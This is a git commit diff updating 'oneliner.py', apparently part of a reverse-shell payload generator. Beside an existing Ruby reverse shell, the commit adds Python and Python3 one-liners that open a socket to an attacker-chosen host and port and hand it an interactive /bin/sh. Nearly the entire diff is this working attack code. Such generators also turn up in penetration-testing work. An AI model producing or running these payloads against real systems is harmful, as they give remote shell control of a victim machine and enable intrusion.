ae15c8fa3db325c72aa19361b8b0add9e58f5543
Sayan Ray <97869734+Sayan690@users.noreply.github.com>
2022-10-14 00:12:21 +0530

    Update oneliner.py

--- Windows/oneliner.py
+++ Windows/oneliner.py
@@ -83,6 +83,12 @@ class Oneliner:
 
 		if self.shell == "ruby":
 			payload = f"""ruby -rsocket -e'f=TCPSocket.open({args.lhost},{args.port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
+		
+		if self.shell == "python":
+			payload = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.args.lhost}",{self.args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
+
+		if self.shell == "python3":
+			payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.args.lhost}",{self.args.port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 
 		if self.args.encode:
 			self.payload = payload
